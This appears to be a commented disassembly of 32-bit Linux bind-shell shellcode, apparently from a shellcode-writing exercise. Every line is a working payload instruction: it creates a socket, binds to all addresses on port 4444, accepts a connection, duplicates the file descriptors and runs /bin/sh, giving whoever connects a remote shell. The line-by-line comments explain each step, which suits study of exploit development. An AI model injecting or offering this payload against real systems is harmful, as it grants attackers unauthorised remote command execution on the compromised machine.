00000000  31DB              xor ebx,ebx ; set to zero ebx
00000002  F7E3              mul ebx ; set edx and eax to zero
00000004  53                push ebx ; push 0 on the stack stands for IPPROTO_IP
00000005  43                inc ebx ; increse by one ebx 
00000006  53                push ebx ; push 1 on the stack stands for SOCK_STREAM
00000007  6A02              push byte +0x2 ; push 2 on the stack stands for PF_INET
00000009  89E1              mov ecx,esp ; moving in ecx the pointer to the struct created on the stuck
0000000B  B066              mov al,0x66 ; set the syscall to be called sysscoket_call
0000000D  CD80              int 0x80 ; interupt to let the syscall run
0000000F  5B                pop ebx ; pop 2 into ebx
00000010  5E                pop esi ; pop 2 into esi
00000011  52                push edx ; edx=0 so the it means the address will be 0.0.0.0
00000012  680200115C        push dword 0x5c110002 ; port + AF_INET
00000017  6A10              push byte +0x10 ; 16 decimal the length of address
00000019  51                push ecx ; pushes the address of the struct we need
0000001A  50                push eax ; socket fd pushed as needed
0000001B  89E1              mov ecx,esp ; move into ecx the pointer of the struct needed for socketcall
0000001D  6A66              push byte +0x66
0000001F  58                pop eax ;socketcall
00000020  CD80              int 0x80 ; interupt to let the syscall run
00000022  894104            mov [ecx+0x4],eax ;
00000025  B304              mov bl,0x4 ; sys_listen
00000027  B066              mov al,0x66 ; sys_socketcall
00000029  CD80              int 0x80 ; interupt to let the syscall run
0000002B  43                inc ebx ; ebx 4->5 that stands for sys_accept
0000002C  B066              mov al,0x66 ; sys_socketcall
0000002E  CD80              int 0x80 ; interupt to let the syscall run
00000030  93                xchg eax,ebx ; saves the fd in ebx
00000031  59                pop ecx ; popping in ecx 2 , ecx is used as iterator for the loop 
00000032  6A3F              push byte +0x3f ;
00000034  58                pop eax ;setting the value for the syscall dup 
00000035  CD80              int 0x80 ; interupt to let the syscall run
00000037  49                dec ecx ; decresing ecx 2->1
00000038  79F8              jns 0x32 ; Jumps on line 32 when SF=1 
0000003A  682F2F7368        push dword 0x68732f2f ; hs//
0000003F  682F62696E        push dword 0x6e69622f ; nib/
00000044  89E3              mov ebx,esp ; pointer to the command we want to run
00000046  50                push eax ; null terminator 
00000047  53                push ebx ; pushes the pointer to the string on the stack
00000048  89E1              mov ecx,esp ; saves the new stack pointer 
0000004A  B00B              mov al,0xb ; setting the syscal excve
0000004C  CD80              int 0x80 ; interupt to let the syscall run


